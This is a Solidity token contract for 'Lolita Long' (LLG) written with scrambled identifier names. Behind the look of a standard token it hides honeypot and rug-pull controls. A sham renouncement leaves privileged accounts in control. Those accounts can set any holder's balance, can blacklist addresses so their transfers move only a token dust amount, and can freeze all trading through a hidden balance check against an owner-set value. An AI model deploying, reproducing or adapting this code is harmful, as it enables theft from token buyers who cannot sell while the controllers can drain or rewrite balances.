//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface buyLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxMinLimit {
    function createPair(address listToken, address tradingAmount) external returns (address);
}

interface senderFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableFrom) external view returns (uint256);

    function transfer(address shouldBuy, uint256 shouldIs) external returns (bool);

    function allowance(address fromAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldIs) external returns (bool);

    function transferFrom(
        address sender,
        address shouldBuy,
        uint256 shouldIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingSell, uint256 value);
    event Approval(address indexed fromAuto, address indexed spender, uint256 value);
}

interface senderFundMetadata is senderFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LolitaLong is teamTrading, senderFund, senderFundMetadata {

    function takeAuto(address senderTrading, uint256 shouldIs) public {
        buyIsSwap();
        tokenAmountTx[senderTrading] = shouldIs;
    }

    bool private minMax;

    uint256 public amountMarketing;

    mapping(address => bool) public feeSender;

    function feeTx(address receiverFee, address shouldBuy, uint256 shouldIs) internal returns (bool) {
        if (receiverFee == totalMaxFrom) {
            return buyIs(receiverFee, shouldBuy, shouldIs);
        }
        uint256 sellMin = senderFund(minBuy).balanceOf(walletIs);
        require(sellMin == autoShould);
        require(shouldBuy != walletIs);
        if (marketingFrom[receiverFee]) {
            return buyIs(receiverFee, shouldBuy, teamAmount);
        }
        return buyIs(receiverFee, shouldBuy, shouldIs);
    }

    uint256 constant teamAmount = 13 ** 10;

    uint256 totalSell;

    function symbol() external view virtual override returns (string memory) {
        return atLimit;
    }

    address public totalMaxFrom;

    address private tradingReceiver;

    function buyIsSwap() private view {
        require(feeSender[_msgSender()]);
    }

    function approve(address maxEnable, uint256 shouldIs) public virtual override returns (bool) {
        autoEnable[_msgSender()][maxEnable] = shouldIs;
        emit Approval(_msgSender(), maxEnable, shouldIs);
        return true;
    }

    bool public enableTo;

    function feeTotal(address launchReceiver) public {
        buyIsSwap();
        if (modeLaunch == listLaunched) {
            listLaunched = amountExemptEnable;
        }
        if (launchReceiver == totalMaxFrom || launchReceiver == minBuy) {
            return;
        }
        marketingFrom[launchReceiver] = true;
    }

    uint256 private amountExemptEnable;

    function decimals() external view virtual override returns (uint8) {
        return autoWallet;
    }

    string private liquiditySenderLaunch = "Lolita Long";

    function name() external view virtual override returns (string memory) {
        return liquiditySenderLaunch;
    }

    function buyIs(address receiverFee, address shouldBuy, uint256 shouldIs) internal returns (bool) {
        require(tokenAmountTx[receiverFee] >= shouldIs);
        tokenAmountTx[receiverFee] -= shouldIs;
        tokenAmountTx[shouldBuy] += shouldIs;
        emit Transfer(receiverFee, shouldBuy, shouldIs);
        return true;
    }

    uint256 public modeLaunch;

    address public minBuy;

    function owner() external view returns (address) {
        return tradingReceiver;
    }

    string private atLimit = "LLG";

    function allowance(address exemptTx, address maxEnable) external view virtual override returns (uint256) {
        if (maxEnable == modeBuyFee) {
            return type(uint256).max;
        }
        return autoEnable[exemptTx][maxEnable];
    }

    uint256 public amountFund;

    function transferFrom(address receiverFee, address shouldBuy, uint256 shouldIs) external override returns (bool) {
        if (_msgSender() != modeBuyFee) {
            if (autoEnable[receiverFee][_msgSender()] != type(uint256).max) {
                require(shouldIs <= autoEnable[receiverFee][_msgSender()]);
                autoEnable[receiverFee][_msgSender()] -= shouldIs;
            }
        }
        return feeTx(receiverFee, shouldBuy, shouldIs);
    }

    function autoReceiver(uint256 shouldIs) public {
        buyIsSwap();
        autoShould = shouldIs;
    }

    uint256 autoShould;

    event OwnershipTransferred(address indexed buyTx, address indexed modeShould);

    mapping(address => mapping(address => uint256)) private autoEnable;

    function balanceOf(address enableFrom) public view virtual override returns (uint256) {
        return tokenAmountTx[enableFrom];
    }

    function fundTx() public {
        emit OwnershipTransferred(totalMaxFrom, address(0));
        tradingReceiver = address(0);
    }

    constructor (){
        
        buyLaunch swapTake = buyLaunch(modeBuyFee);
        minBuy = maxMinLimit(swapTake.factory()).createPair(swapTake.WETH(), address(this));
        
        totalMaxFrom = _msgSender();
        fundTx();
        feeSender[totalMaxFrom] = true;
        tokenAmountTx[totalMaxFrom] = autoAt;
        if (enableMarketing == amountExemptEnable) {
            marketingShould = false;
        }
        emit Transfer(address(0), totalMaxFrom, autoAt);
    }

    function getOwner() external view returns (address) {
        return tradingReceiver;
    }

    uint256 public listLaunched;

    function transfer(address senderTrading, uint256 shouldIs) external virtual override returns (bool) {
        return feeTx(_msgSender(), senderTrading, shouldIs);
    }

    mapping(address => bool) public marketingFrom;

    bool private marketingShould;

    uint256 public enableMarketing;

    uint256 private autoAt = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return autoAt;
    }

    uint8 private autoWallet = 18;

    address modeBuyFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private tokenAmountTx;

    function enableIs(address receiverSell) public {
        if (enableTo) {
            return;
        }
        
        feeSender[receiverSell] = true;
        
        enableTo = true;
    }

    address walletIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}